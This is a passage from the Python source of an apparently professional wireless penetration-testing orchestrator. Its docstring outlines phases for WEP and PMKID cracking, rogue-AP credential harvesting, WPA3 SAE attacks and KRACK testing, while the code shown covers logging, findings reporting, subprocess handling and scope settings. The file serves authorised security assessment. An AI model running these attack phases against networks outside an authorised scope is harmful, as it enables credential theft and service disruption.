#!/usr/bin/env python3
"""
aether.py — Wireless Penetration Testing Orchestrator
======================================================
Orchestrates multi-phase wireless assessments via:
  Phase 0   — WEP IV capture and key cracking           (aircrack-ng suite)
  Phase 1a  — PMKID clientless capture + hashcat crack  (hcxdumptool / hashcat)
  Phase 1b  — WPA/WPA2/WPA3 handshake + WPS             (wifite2)
  Phase 2   — WPA-Enterprise rogue AP / cred harvest    (EAPHammer + asleap)
  Phase 3   — WPA3 SAE cryptographic vulnerability      (dragonslayer)
  Phase 4   — WPA3 SAE resource exhaustion              (dragondrain)
  Phase 5   — WPA2 KRACK key reinstallation testing     (krackattacks-scripts)

Protocol tokens (emitted to stdout for Crucible frontend):
  __CRUCIBLE_LOG__    <message>
  __CRUCIBLE_ERR__    <message>
  __CRUCIBLE_STATUS__ <json>
  __CRUCIBLE_FINDING__<json>
  __CRUCIBLE_PROMPT__ <message>

Usage:
  python3 aether.py --config config.json --project my_assessment
  python3 aether.py --phase pmkid --interface wlan1 --project quick_test
  python3 aether.py --list-phases
"""

import argparse
import json
import errno
import math
import os
import platform
import re
import select
import shutil
import signal
import subprocess
import sys
import tempfile
import time
import urllib.error
import urllib.parse
import urllib.request
from collections import Counter
from datetime import datetime, timezone
from html.parser import HTMLParser as _HTMLParser
from itertools import permutations as _permutations
from pathlib import Path
import hashlib
import hmac
import ipaddress
import queue
import socket
import struct
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

VERSION = Path(__file__).resolve().parent.joinpath("VERSION").read_text().strip()


def _clients_base() -> Path:
    """Return the OS-appropriate default parent directory for client project folders."""
    system = platform.system()
    if system == "Windows":
        base = Path("C:/clients")
    elif system == "Darwin":
        base = Path("/Users/Shared/clients")
    else:
        base = Path("/clients")
    base.mkdir(parents=True, exist_ok=True)
    return base


def _build_project_dir(client_short: str, start_date: str, tool_name: str) -> Path:
    """
    Build a structured project directory:
      <clients_base>/<client_short>/<year>/<tool_name>/<client_short>_<datetime>/

    v1.12.4: when the caller supplies no client_short, the slug now resolves
    to 'adhoc_<timestamp>' rather than the static 'client' literal that earlier
    versions used.  Without that change, every Aether invocation that omitted
    both --project AND client_short in config silently dumped its data into
    /clients/client/<year>/aether/, creating an ever-growing pile of stub
    directories next to the legitimate per-client trees.  A loud warning is
    emitted to stderr so the operator can see when the fallback fires.
    """
    import re as _re
    raw = (client_short or "").strip()
    dt_str = datetime.now().strftime('%Y%m%d_%H%M%S')
    if raw:
        slug = _re.sub(r'[^\w-]', '_', raw.lower()).strip('_') or f"adhoc_{dt_str}"
    else:
        slug = f"adhoc_{dt_str}"
        print(
            "[Aether] WARNING: no client_short supplied and --project omitted; "
            f"writing to fallback slug '/clients/{slug}/'.  Set client_short "
            "in config.json or pass --project to land in the right client tree.",
            flush=True, file=sys.stderr,
        )
    year = (start_date[:4] if start_date and len(start_date) >= 4 and start_date[:4].isdigit()
            else datetime.now().strftime('%Y'))
    path = _clients_base() / slug / year / tool_name / f"{slug}_{dt_str}"
    path.mkdir(parents=True, exist_ok=True)
    return path


def _write_project_meta(project_dir: Path, tool: str, client_name: str,
                        client_short: str, year: str, version: str) -> None:
    """Write project_meta.json so Flask apps can discover this project."""
    import json as _json
    try:
        (project_dir / "project_meta.json").write_text(
            _json.dumps({
                "tool":         tool,
                "client_name":  client_name,
                "client_short": client_short,
                "year":         year,
                "created_at":   datetime.now().isoformat(),
                "version":      version,
            }, indent=2),
            encoding="utf-8",
        )
    except Exception:
        pass


def _u_dual_write_meta(project_dir, *, tool: str, version: str,
                       client_short: str = "", client_name: str = "",
                       engagement_name: str = "", target: str = "") -> bool:
    """Dual-write universal meta.json (schema 1.0). Graceful no-op when
    /opt/pr0t31n/shared/pr0t31n_schema.py is not installed."""
    try:
        import sys as _s
        if "/opt/pr0t31n/shared" not in _s.path:
            _s.path.insert(0, "/opt/pr0t31n/shared")
        import pr0t31n_schema as _us
    except ImportError:
        return False
    try:
        meta = _us.make_meta(
            tool=tool, version=version,
            client_short=client_short or "unknown",
            client_name=client_name or client_short or "unknown",
            engagement_name=engagement_name or f"{tool} run",
            target=target or "",
        )
        _us.atomic_write_json(Path(project_dir) / "meta.json", meta)
        return True
    except Exception:
        return False


# ── Findings catalogue ────────────────────────────────────────────────────────
_catalogue: dict[str, dict] = {}


def _load_catalogue() -> None:
    """Load findings catalogue. Accepts both the v1.7+ wrapper format
    ({findings: [...]}) and a bare top-level array. Previous loader
    silently failed against the wrapper format leaving _catalogue empty."""
    global _catalogue
    cat_path = Path(__file__).parent / "findings_catalogue.json"
    if not cat_path.exists():
        return
    try:
        data = json.loads(cat_path.read_text(encoding="utf-8"))
        entries = (data["findings"] if isinstance(data, dict) and "findings" in data
                   else data)
        if not isinstance(entries, list):
            return
        # Index by canonical `id` (AETHER-NNN, AETHER-INFO-AP, …) AND by
        # legacy `_x_catalogue_id` aliases (pmf_not_enforced, btm_hijack,
        # captive_bypass, …) so emit sites using either form resolve.
        # Without the alias index, `finding_from_cat("pmf_not_enforced", …)`
        # silently misses → entry={} → severity defaults to HIGH for every
        # PMF/BTM/captive finding.
        _catalogue = {}
        for e in entries:
            if not isinstance(e, dict):
                continue
            cid = e.get("id")
            if cid:
                _catalogue[cid] = e
            alias = e.get("_x_catalogue_id")
            if alias and alias != cid:
                _catalogue[alias] = e
    except Exception as exc:
        print(f"[Aether] catalogue load failed: {exc}", flush=True)


# ── In-process findings collector ────────────────────────────────────────────
_findings_collected: list[dict] = []
_RUN_DIR: Path | None = None
_fdb = None


def _init_fdb():
    global _fdb
    _db_path = os.environ.get("PR0T31N_FINDINGS_DB")
    if _db_path:
        try:
            import sys as _s
            if "/opt/pr0t31n/shared" not in _s.path:
                _s.path.insert(0, "/opt/pr0t31n/shared")
            import pr0t31n_findings_db
            _fdb = pr0t31n_findings_db.FindingsDB(_db_path)
        except Exception:
            pass


# ── Output protocol ───────────────────────────────────────────────────────────
_MANAGED = os.environ.get("CRUCIBLE_MANAGED", "") == "1"
_log_fh = None  # opened in main() once the project dir is known

# §13b/§14j/§14k: canonical run-dir audit log (scan.log + scan.log.json + errors.log),
# alongside the legacy aether_console.log. Set in main() once the project dir exists.
try:
    import sys as _s_el
    if "/opt/pr0t31n/shared" not in _s_el.path:
        _s_el.path.insert(0, "/opt/pr0t31n/shared")
    import pr0t31n_event_log as _el
except Exception:
    _el = None
_RUNLOG = None

try:
    import pr0t31n_pause as _pp
except ImportError:
    _pp = None
_PAUSE = None


def _check_pause():
    if _PAUSE is not None and _PAUSE.check_and_pause():
        sys.exit(_pp.EXIT_PAUSED)


def _pause_sleep(seconds):
    """Sleep for *seconds* but break early if a pause is requested."""
    _deadline = time.monotonic() + seconds
    while time.monotonic() < _deadline:
        if _PAUSE is not None and _PAUSE.is_pause_requested:
            break
        time.sleep(min(2, max(0, _deadline - time.monotonic())))


def _save_checkpoint(project_dir):
    """Best-effort checkpoint: flush findings collected so far."""
    try:
        save_findings(Path(project_dir))
    except Exception:
        pass


def _tok(token: str, msg: str) -> None:
    if _MANAGED:
        print(f"{token}:{msg}", flush=True)
    else:
        ts = datetime.now().strftime("%H:%M:%S")
        if token == "__CRUCIBLE_LOG__":
            print(f"[{ts}] [*] {msg}", flush=True)
        elif token == "__CRUCIBLE_ERR__":
            print(f"[{ts}] [!] {msg}", flush=True)
        elif token == "__CRUCIBLE_STATUS__":
            try:
                d = json.loads(msg)
                step = f" — {d['step']}" if d.get("step") else ""
                print(f"[{ts}] [{d.get('status','?').upper()}] "
                      f"{d.get('label', d.get('phase','?'))}{step}", flush=True)
            except Exception:
                print(f"[{ts}] [STATUS] {msg}", flush=True)
        elif token == "__CRUCIBLE_FINDING__":
            try:
                d = json.loads(msg)
                print(f"[{ts}] [+] FINDING: [{d.get('severity','?')}] "
                      f"{d.get('title','?')}", flush=True)
            except Exception:
                print(f"[{ts}] [+] FINDING: {msg[:120]}", flush=True)
        else:
            print(f"[{ts}] {msg}", flush=True)
    if _log_fh is not None:
        ts = datetime.now().strftime("%H:%M:%S")
        if token == "__CRUCIBLE_LOG__":
            _log_fh.write(f"[{ts}] {msg}\n")
        elif token == "__CRUCIBLE_ERR__":
            _log_fh.write(f"[{ts}] [!] {msg}\n")
        elif token == "__CRUCIBLE_STATUS__":
            try:
                d = json.loads(msg)
                step = f" — {d['step']}" if d.get("step") else ""
                _log_fh.write(f"[{ts}] [{d.get('status','?').upper()}] "
                              f"{d.get('label', d.get('phase','?'))}{step}\n")
            except Exception:
                pass
        _log_fh.flush()
    # §13b/§14j: mirror to the canonical run-dir audit log with a timestamp.
    if _RUNLOG is not None:
        try:
            if token == "__CRUCIBLE_LOG__":
                _RUNLOG.info(msg)
            elif token == "__CRUCIBLE_ERR__":
                _RUNLOG.error(msg)
            elif token == "__CRUCIBLE_STATUS__":
                d = json.loads(msg)
                step = f" — {d['step']}" if d.get("step") else ""
                _RUNLOG.event(f"phase {d.get('phase','?')}: {d.get('status','?')}{step}")
        except Exception:
            pass


def log(msg: str)    -> None: _tok("__CRUCIBLE_LOG__",     msg)
def err(msg: str)    -> None: _tok("__CRUCIBLE_ERR__",     msg)


def status(phase: str, label: str, state: str, step: str = "") -> None:
    _tok("__CRUCIBLE_STATUS__", json.dumps({
        "phase": phase, "label": label, "status": state, "step": step,
        "ts": datetime.now().isoformat(),
    }))


_AETHER_RUN_DIR: "Path | None" = None   # §14/§13c: run dir, set once known


def _set_aether_run_dir(p) -> None:
    global _AETHER_RUN_DIR
    _AETHER_RUN_DIR = Path(p) if p else None


def _aether_rel(p):
    """§13c: return path relative to the run dir, or the original on failure."""
    if not p or _AETHER_RUN_DIR is None:
        return p
    try:
        return str(Path(p).resolve().relative_to(_AETHER_RUN_DIR.resolve()))
    except Exception:
        return p


def _emit_run_log(cmd, started, ended, rc, stdout, stderr) -> None:
    """§14: emit a .log sibling (in <run_dir>/tool_logs/) for an external-tool
    invocation made via _run / _popen."""
    if _AETHER_RUN_DIR is None:
        return
    try:
        import sys as _s
        if "/opt/pr0t31n/shared" not in _s.path:
            _s.path.insert(0, "/opt/pr0t31n/shared")
        import pr0t31n_tool_runner as _ur
        _ur.write_tool_log(
            cmd=cmd, started=started, ended=ended, exit_code=rc,
            stdout=stdout or "", stderr=stderr or "",
            tool_name=(cmd[0] if isinstance(cmd, (list, tuple)) and cmd else "tool"),
            log_dir=str(_AETHER_RUN_DIR / "tool_logs"),
        )
    except Exception:
        pass


def finding(title: str, severity: str, description: str,
            data: dict | None = None, output_file: str = "",
            cvss_score: float | None = None, cvss_vector: str = "") -> None:
    rec = {
        "title": title, "severity": severity, "description": description,
        "data": data or {}, "output_file": _aether_rel(output_file),
        "ts": datetime.now().isoformat(),
    }
    if cvss_score is not None:
        rec["cvss_score"]  = cvss_score
        rec["cvss_vector"] = cvss_vector
    _findings_collected.append(rec)
    if _fdb:
        try:
            _fdb.insert_finding(rec)
        except Exception:
            pass
    _tok("__CRUCIBLE_FINDING__", json.dumps(rec))
    _flush_findings()


def finding_from_cat(cat_id: str, data: dict | None = None,
                     output_file: str = "", title_override: str = "") -> None:
    """Emit a finding using catalogue as authoritative source for all metadata,
    including risk + CVSS when present.  Reads `risk` per universal schema
    v1.1 (§13c) with fallbacks to legacy `_x_severity` / `severity`, ending
    at HIGH only when the catalogue is silent.  Previous version read
    `severity` only, which silently defaulted every finding to HIGH because
    catalogue entries use `risk` as the field name."""
    entry = _catalogue.get(cat_id, {})
    risk = (entry.get("risk")
            or entry.get("_x_severity")
            or entry.get("severity")
            or "HIGH")
    remediation = (entry.get("remediation")
                   or entry.get("remediation_brief")
                   or entry.get("_x_remediation", ""))
    cvss = entry.get("cvss_score")
    if cvss is None:
        cvss = entry.get("cvss_v3_base")
    if cvss is None:
        cvss = entry.get("_x_cvss_score")
    finding(
        title=title_override or entry.get("title", cat_id),
        severity=risk,
        description=entry.get("description", cat_id),
        data={**(data or {}), "catalogue_id": cat_id,
              "remediation": remediation},
        output_file=output_file,
        cvss_score=cvss,
        cvss_vector=entry.get("cvss_vector", ""),
    )


# Catalogue-ID-driven merge.  Each entry maps a catalogue_id to a function
# that extracts the grouping key from the finding's data.  Findings that
# share both catalogue_id AND grouping key are collapsed into a single
# entry whose `data["merged_records"]` holds every contributor's data and
# whose `affected` list (synthesised at universal-output time) is the union
# of per-record identifiers (BSSIDs, client MACs, etc.).
#
# Adding a new merge: add the catalogue_id key + key-extractor lambda.
# Catalogue IDs not present here pass through un-merged.
_AETHER_MERGE_KEYS = {
    # Inventory: collapse per-AP findings into one per SSID
    "AETHER-INFO-AP":         lambda d: ("ssid",   d.get("ssid", "")),
    # Auth types: collapse only when every detail matches EXCEPT the BSSID, so
    # two APs that share an SSID but differ in auth/encryption stay separate.
    "AETHER-INFO-AUTH-TYPE":  lambda d: ("auth_signature", "|".join([
                                  d.get("ssid", ""), d.get("auth_type", ""),
                                  d.get("encryption_raw", ""), d.get("auth_raw", "")])),
    "AETHER-INFO-CHANNEL":    lambda d: ("ssid",   d.get("ssid", "")),
    "AETHER-INFO-VENDOR":     lambda d: ("vendor", d.get("vendor", "")),
    # Client observations: collapse per-client findings into one per (SSID, BSSID)
    "AETHER-INFO-CLIENT":     lambda d: ("ssid+bssid", "|".join([
                                  d.get("associated_ssid", ""),
                                  d.get("associated_bssid", "")])),
    "AETHER-INFO-PROBE":      lambda d: ("bssid",  d.get("seen_on_bssid", "")),
    # PMF / BTM: collapse per-attack-attempt findings into one per BSSID
    "AETHER-022":             lambda d: ("bssid",  d.get("bssid", "")),  # pmf_not_enforced
    "AETHER-023":             lambda d: ("bssid",  d.get("bssid", "")),  # btm_hijack
    "pmf_not_enforced":       lambda d: ("bssid",  d.get("bssid", "")),
    "btm_hijack":             lambda d: ("bssid",  d.get("bssid", "")),
}

# Canonical merged-finding titles.  When a group merges, the title is
# replaced with this so consumers see one descriptive heading per group
# instead of N variant titles (e.g. one per client MAC).  Empty here means
# keep the first record's title as-is.
#
# Each lambda receives the first contributing record's `data` dict so titles
# can be built from multiple fields (e.g. auth-type groups keyed on a composite
# signature still render a human-readable SSID + auth-type heading).
_AETHER_MERGED_TITLES = {
    "AETHER-INFO-AP":         lambda d: f"Wireless Access Points Observed on SSID: {d.get('ssid','')}",
    "AETHER-INFO-AUTH-TYPE":  lambda d: f"Authentication Type Classified: {d.get('auth_type','')} (SSID: {d.get('ssid','')})",
    "AETHER-INFO-CHANNEL":    lambda d: f"Channel Allocations Observed on SSID: {d.get('ssid','')}",
    "AETHER-INFO-VENDOR":     lambda d: f"Wireless Vendor Identified: {d.get('vendor','')}",
    "AETHER-INFO-CLIENT":     lambda d: f"Client Devices Observed on SSID: {d.get('associated_ssid','')} BSSID: {d.get('associated_bssid','')}",
    "AETHER-INFO-PROBE":      lambda d: f"Client Probe Requests Observed on BSSID: {d.get('seen_on_bssid','')}",
    "AETHER-022":             lambda d: f"PMF Not Required: Management Frames Unprotected on BSSID {d.get('bssid','')}",
    "AETHER-023":             lambda d: f"BSS Transition Management Hijack Successful on BSSID {d.get('bssid','')}",
    "pmf_not_enforced":       lambda d: f"PMF Not Required: Management Frames Unprotected on BSSID {d.get('bssid','')}",
    "btm_hijack":             lambda d: f"BSS Transition Management Hijack Successful on BSSID {d.get('bssid','')}",
}


def _merge_native_findings(records: list) -> list:
    """Collapse findings whose catalogue_id is registered in _AETHER_MERGE_KEYS
    into a single per-group entry.  Grouping key is (catalogue_id, key) where
    key is extracted from each finding's data per the lambda registered above.
    Findings outside the registered set pass through unchanged."""
    merged: dict[tuple, dict] = {}
    out: list = []
    for rec in records:
        if not isinstance(rec, dict):
            out.append(rec); continue
        data = rec.get("data") or {}
        cat_id = data.get("catalogue_id", "")
        if cat_id and cat_id in _AETHER_MERGE_KEYS:
            key_field, key_val = _AETHER_MERGE_KEYS[cat_id](data)
            mk = (cat_id, key_field, key_val)
            if mk in merged:
                merged[mk]["data"].setdefault("merged_records", []).append(data)
            else:
                new_rec = dict(rec)
                # Replace per-record title with the group title so the
                # consumer sees one heading per (catalogue_id, group key)
                if cat_id in _AETHER_MERGED_TITLES and key_val:
                    new_rec["title"] = _AETHER_MERGED_TITLES[cat_id](data)
                new_rec["data"] = {
                    **{k: v for k, v in data.items() if k != "merged_records"},
                    "merged_records": [data],
                    "merge_key_field": key_field,
                    "merge_key_value": key_val,
                }
                merged[mk] = new_rec
                out.append(new_rec)
        else:
            out.append(rec)
    return out


def save_findings(output_dir: Path) -> None:
    consolidated = _merge_native_findings(_findings_collected)
    out = output_dir / "findings_crucible.json"
    out.write_text(json.dumps(consolidated, indent=2), encoding="utf-8")
    log(f"Findings written: {out} "
        f"({len(consolidated)} consolidated; {len(_findings_collected)} raw)")
    # Synthesise universal findings.json + summary.json (schema 1.0) alongside.
    _u_synthesize_outputs(output_dir, consolidated)


def _flush_findings():
    if _RUN_DIR is None:
        return
    try:
        save_findings(_RUN_DIR)
    except Exception:
        pass


def _u_synthesize_outputs(output_dir: Path, native_findings: list) -> None:
    """Translate Aether's findings_crucible.json entries into universal schema
    and write findings.json + summary.json. BSSID/SSID map to ip/hostname."""
    try:
        import sys as _s
        if "/opt/pr0t31n/shared" not in _s.path:
            _s.path.insert(0, "/opt/pr0t31n/shared")
        import pr0t31n_schema as _us
    except ImportError:
        return
    try:
        mapped = []
        for f in (native_findings or []):
            if not isinstance(f, dict):
                continue
            data    = f.get("data") or {}
            bssid   = data.get("bssid") or data.get("BSSID") or ""
            ssid    = data.get("ssid")  or data.get("SSID")  or ""
            channel = data.get("channel") or data.get("ch")  or 0
            try:
                _ch_int = int(channel) if channel else 0
            except (ValueError, TypeError):
                _ch_int = 0
            # For merged findings (collapsed in _merge_native_findings),
            # build affected[] as the union of grouping-relevant identifiers
            # from every contributor:
            #   merge_key_field=ssid  → affected lists each BSSID under that SSID
            #   merge_key_field=bssid → affected lists each client MAC seen on
            #                           that BSSID (Client/Probe/PMF/BTM groups)
            merged_records = data.get("merged_records") if isinstance(data, dict) else None
            merge_key_field = data.get("merge_key_field", "") if isinstance(data, dict) else ""
            cat_id_m = data.get("catalogue_id", "") if isinstance(data, dict) else ""
            if merged_records:
                aff_items: list[str] = []
                if cat_id_m in ("AETHER-INFO-AP", "AETHER-INFO-AUTH-TYPE"):
                    # Per-SSID (AP) / per-auth-signature group → list BSSIDs only.
                    # Column BSSID is blanked since the group spans many BSSIDs.
                    for mr in merged_records:
                        if not isinstance(mr, dict): continue
                        _b = mr.get("bssid") or mr.get("BSSID") or ""
                        if _b: aff_items.append(_b)
                    bssid = ""
                elif cat_id_m == "AETHER-INFO-CHANNEL":
                    # Per-SSID group → list BSSID/channel combinations.
                    for mr in merged_records:
                        if not isinstance(mr, dict): continue
                        _b  = mr.get("bssid") or mr.get("BSSID") or ""
                        _c  = mr.get("channel") or mr.get("ch") or ""
                        piece = " ".join(p for p in (_b, f"ch{_c}" if _c != "" else "") if p)
                        if piece: aff_items.append(piece)
                    bssid = ""
                elif cat_id_m == "AETHER-INFO-CLIENT":
                    # Per-(SSID, BSSID) group → list client device MACs.  The
                    # group is BSSID-identified, so surface the shared SSID/BSSID
                    # (client records store these as associated_ssid/_bssid).
                    for mr in merged_records:
                        if not isinstance(mr, dict): continue
                        cmac = (mr.get("mac") or mr.get("client_mac")
                                or mr.get("client") or "")
                        if cmac: aff_items.append(cmac)
                    ssid  = data.get("associated_ssid") or ssid
                    bssid = data.get("associated_bssid") or bssid
                elif merge_key_field == "ssid":
                    # Generic per-SSID group → list BSSIDs (+ channel + vendor when present)
                    for mr in merged_records:
                        if not isinstance(mr, dict): continue
                        _bssid_m = mr.get("bssid") or mr.get("BSSID") or ""
                        _ch_m    = mr.get("channel") or mr.get("ch") or ""
                        _auth_m  = mr.get("auth_type") or ""
                        _ven_m   = mr.get("vendor") or ""
                        pieces = [p for p in (_bssid_m,
                                              f"ch{_ch_m}" if _ch_m else "",
                                              _auth_m, _ven_m) if p]
                        if pieces: aff_items.append(" ".join(pieces))
                    bssid = ""
                elif merge_key_field == "bssid":
                    # Group is per-BSSID → list client MACs (+ vendor when known).
                    # Different catalogue_ids store the MAC in different keys —
                    # check each known location.
                    for mr in merged_records:
                        if not isinstance(mr, dict): continue
                        cmac = (mr.get("client") or mr.get("client_mac")
                                or mr.get("mac") or "")
                        cven = mr.get("vendor") or ""
                        probe = mr.get("probed_ssid", "")
                        if cmac and cven:
                            aff_items.append(f"{cmac} ({cven})"
                                             + (f" probed {probe!r}" if probe else ""))
                        elif cmac:
                            aff_items.append(cmac
                                             + (f" probed {probe!r}" if probe else ""))
                    # PMF findings have no per-client MAC — only one per BSSID.
                    # Fall back to ssid identification so the row isn't empty.
                    if not aff_items:
                        _ssid_first = next(
                            (mr.get("ssid", "") for mr in merged_records
                             if isinstance(mr, dict) and mr.get("ssid")),
                            "")
                        if _ssid_first:
                            aff_items.append(f"SSID: {_ssid_first}")
                else:
                    # Other group field — best-effort generic rendering
                    for mr in merged_records:
                        if not isinstance(mr, dict): continue
                        _s = mr.get("ssid", "")
                        _b = mr.get("bssid", "")
                        if _s or _b:
                            aff_items.append(f"{_s} ({_b})".strip())
                affected = "\n".join(sorted(set(i for i in aff_items if i)))
                output_blob = json.dumps(merged_records, indent=2)[:4096]
            else:
                affected = f"{ssid} ({bssid})" if ssid or bssid else ""
                output_blob = json.dumps(data, indent=2)[:4096] if data else ""

            mapped.append({
                "title":       f.get("title", ""),
                "datetime":    f.get("ts", ""),
                # v1.1: ip/hostname/port reserved for actual network identity;
                # wireless-specific data lives in ssid/bssid/wireless_data.
                "ip":          "",
                "port":        0,
                "hostname":    "",
                "risk":        str(f.get("severity", "INFO")).upper(),
                "command":     f.get("command", ""),
                "description": f.get("description", ""),
                "output":      output_blob,
                "output_file": f.get("output_file", ""),
                "cves":        ",".join(f.get("cves", []) or []),
                "sources":     "aether",
                "service":     "wifi",
                "affected":    affected,
                "remediation": f.get("remediation", "Review wireless configuration."),
                "owasp":       "", "owasp_url": "", "nist": "",
                "exploitdb":   False, "metasploit": False, "exploit_details": [],
                # v1.1 enrichment
                "ssid":          ssid,
                "bssid":         bssid,
                "wireless_data": {**data, "channel": _ch_int} if data else {},
                "cvss_score":    f.get("cvss_score"),
                "cvss_vector":   f.get("cvss_vector", ""),
            })
        n = _us.write_universal_findings(output_dir, mapped,
                                          tool="aether", scope=None, phase="")
        risk_counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
        for m in mapped:
            r = str(m.get("risk", "INFO")).upper()
            if r in risk_counts:
                risk_counts[r] += 1
        from datetime import datetime as _dt, timezone as _tz
        now = _dt.now(_tz.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
        _us.write_summary(output_dir, _us.make_summary(
            tool="aether", version=VERSION,
            scan_start=now, scan_end=now,
            target="wireless", success=True,
            total_findings=n, risk_counts=risk_counts,
        ))
    except Exception as e:
        try:
            log(f"universal output synthesis failed: {e}")
        except Exception:
            pass


# ── Subprocess helpers ────────────────────────────────────────────────────────

_ANSI_ESC = re.compile(r'\x1b(?:\[[0-9;?]*[a-zA-Z]|[()][012AB])')

def _strip_ansi(text: str) -> str:
    return _ANSI_ESC.sub('', text)

# ── Per-subprocess memory limit ──────────────────────────────────────────────
_SUBPROCESS_MEM_LIMIT_BYTES = int(2 * 1024 ** 3)  # 2 GB per child process

def _mem_limit_preexec():
    """preexec_fn: cap each child's virtual address space to prevent OOM."""
    if sys.platform == "win32":
        return
    try:
        import resource as _rlim
        _rlim.setrlimit(_rlim.RLIMIT_AS,
                        (_SUBPROCESS_MEM_LIMIT_BYTES, _SUBPROCESS_MEM_LIMIT_BYTES))
    except (AttributeError, ValueError, OSError):
        pass

_tracked_procs: list = []
_tracked_procs_lock = threading.Lock()

def _track_proc(proc, operation=""):
    with _tracked_procs_lock:
        _tracked_procs.append(proc)
    if _PAUSE is not None:
        try:
            _PAUSE.register(proc, operation or f"pid={proc.pid}")
        except Exception:
            pass

def _start_oom_watchdog(threshold_pct=90, interval=15):
    """Kill the largest tracked subprocess when system memory exceeds threshold."""
    try:
        import psutil as _psw
    except ImportError:
        return None

    def _watchdog():
        while True:
            try:
                time.sleep(interval)
                mem = _psw.virtual_memory()
                if mem.percent < threshold_pct:
                    continue
                with _tracked_procs_lock:
                    _tracked_procs[:] = [p for p in _tracked_procs if p.poll() is None]
                    live = list(_tracked_procs)
                if not live:
                    continue
                biggest, biggest_rss = None, 0
                for p in live:
                    try:
                        pi = _psw.Process(p.pid)
                        rss = pi.memory_info().rss
                        if rss > biggest_rss:
                            biggest, biggest_rss = p, rss
                    except (_psw.NoSuchProcess, _psw.AccessDenied, OSError):
                        pass
                if biggest and biggest_rss > 100 * 1024 * 1024:
                    try:
                        biggest.kill()
                    except OSError:
                        pass
            except Exception:
                pass

    _t = threading.Thread(target=_watchdog, daemon=True, name="ae-oom-watchdog")
    _t.start()
    return _t


def _popen(cmd: list, **kwargs) -> subprocess.Popen:
    kwargs.setdefault("stdin", subprocess.DEVNULL)
    if "preexec_fn" not in kwargs and sys.platform != "win32":
        kwargs["preexec_fn"] = _mem_limit_preexec
    proc = subprocess.Popen(cmd, **kwargs)
    _track_proc(proc)
    if _PAUSE is not None:
        try:
            _PAUSE.register(proc, " ".join(str(c) for c in cmd))
        except Exception:
            pass
    try:
        _now = datetime.now(timezone.utc)
        _emit_run_log(cmd, _now, _now, None, "",
                      f"(spawned background process pid={proc.pid})")
    except Exception:
        pass
    return proc


def _run(cmd: list, timeout: int = 60) -> tuple[str, int]:
    if _PAUSE and _PAUSE.is_pause_requested:
        return "(paused)", -1
    _st = datetime.now(timezone.utc)
    try:
        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            text=True, stdin=subprocess.DEVNULL,
            preexec_fn=_mem_limit_preexec if sys.platform != "win32" else None)
        _pause_key = None
        if _PAUSE:
            _pause_key = _PAUSE.register(proc, " ".join(str(c) for c in cmd))
        try:
            stdout, stderr = proc.communicate(timeout=timeout)
        except subprocess.TimeoutExpired:
            proc.kill()
            stdout, stderr = proc.communicate()
            _emit_run_log(cmd, _st, datetime.now(timezone.utc), -1, "", "(timeout)")
            return "(timeout)", -1
        finally:
            if _pause_key is not None:
                _PAUSE.unregister(_pause_key)
        _emit_run_log(cmd, _st, datetime.now(timezone.utc), proc.returncode,
                      stdout, stderr)
        return (stdout or "") + (stderr or ""), proc.returncode
    except Exception as exc:
        _emit_run_log(cmd, _st, datetime.now(timezone.utc), -1, "", str(exc))
        return str(exc), -1


def _kill_proc(proc: subprocess.Popen, wait_secs: int = 5) -> None:
    """SIGTERM then SIGKILL if the process does not exit cleanly."""
    try:
        proc.terminate()
        proc.wait(timeout=wait_secs)
    except subprocess.TimeoutExpired:
        proc.kill()
        try:
            proc.wait(timeout=3)
        except Exception:
            pass
    except Exception:
        pass
    if _PAUSE is not None:
        try:
            _PAUSE.unregister(proc.pid)
        except Exception:
            pass


def _readline_timed(stdout, deadline: float) -> bytes | None:
    """Read one line from a binary pipe honouring a wall-clock deadline."""
    remaining = deadline - time.time()
    if remaining <= 0:
        return None
    ready, _, _ = select.select([stdout], [], [], remaining)
    if not ready:
        return None
    line = stdout.readline()
    return line if line else None


# ── Scope enforcement ─────────────────────────────────────────────────────────
# Populated from config at startup; empty means "all targets allowed".
_scope_bssids: set[str] = set()
_scope_ssids:  set[str] = set()
_scope_modes: dict[str, str] = {}
_scope_default_mode: str = "active"


# ── Project-scoped wordlist storage ───────────────────────────────────────
# Set by run() at startup.  When non-None, generated wordlists (SSID-seeded,
# domain-derived, website-scraped, multi-source merges) land in
# <project>/wordlists/ with descriptive names instead of /tmp/tmpXXXXXX.
# When None (e.g. unit tests, direct CLI without --project), helpers fall
# back to system tempdir so legacy behaviour is preserved.
_PROJECT_WORDLIST_DIR: "Path | None" = None


def _set_project_wordlist_dir(p) -> None:
    """Register the project's wordlists/ directory.  Idempotent — safe to
    call multiple times; only the most recent value is used."""
    global _PROJECT_WORDLIST_DIR
    if p is None:
        _PROJECT_WORDLIST_DIR = None
        return
    pp = Path(p) if not isinstance(p, Path) else p
    pp.mkdir(parents=True, exist_ok=True)
    _PROJECT_WORDLIST_DIR = pp


def _sanitize_wordlist_name(s: str) -> str:
    """Turn an arbitrary descriptor (SSID, hostname, domain) into a
    filesystem-safe filename stem.  Collapses runs of non-alphanumerics
    to a single underscore, trims to 64 chars, removes leading/trailing
    underscores.  Empty input -> 'unnamed'."""
    if not s:
        return "unnamed"
    cleaned = re.sub(r"[^A-Za-z0-9._-]+", "_", str(s)).strip("_")
    cleaned = cleaned[:64] if cleaned else "unnamed"
    return cleaned or "unnamed"


def _open_wordlist_file(descriptive_name: str, suffix: str = ".txt"):
    """Open a wordlist for writing.

    If a project wordlist dir is registered, the file lives at
    <project>/wordlists/<sanitized_name><suffix> — collision-safe via a
    numeric suffix (_1, _2, ...) when the bare name already exists.
    Otherwise falls back to tempfile.NamedTemporaryFile in the system
    tempdir (legacy /tmp behaviour) so callers that run without a
    project (unit tests, ad-hoc CLI use) continue to work.

    Returns (path: Path, file_handle).  Caller closes the handle.
    """
    wl_dir = _PROJECT_WORDLIST_DIR
    if wl_dir is not None:
        try:
            wl_dir.mkdir(parents=True, exist_ok=True)
            stem = _sanitize_wordlist_name(descriptive_name)
            target = wl_dir / f"{stem}{suffix}"
            n = 1
            while target.exists():
                target = wl_dir / f"{stem}_{n}{suffix}"
                n += 1
            fh = open(target, "w", encoding="utf-8")
            return target, fh
        except OSError as exc:
            # Fall through to tempfile on permission / disk-full errors so
            # the scan keeps running.  Logged so the operator sees it.
            err(f"_open_wordlist_file: could not write to {wl_dir} ({exc}) — "
                "falling back to system tempdir")
    tmp = tempfile.NamedTemporaryFile(
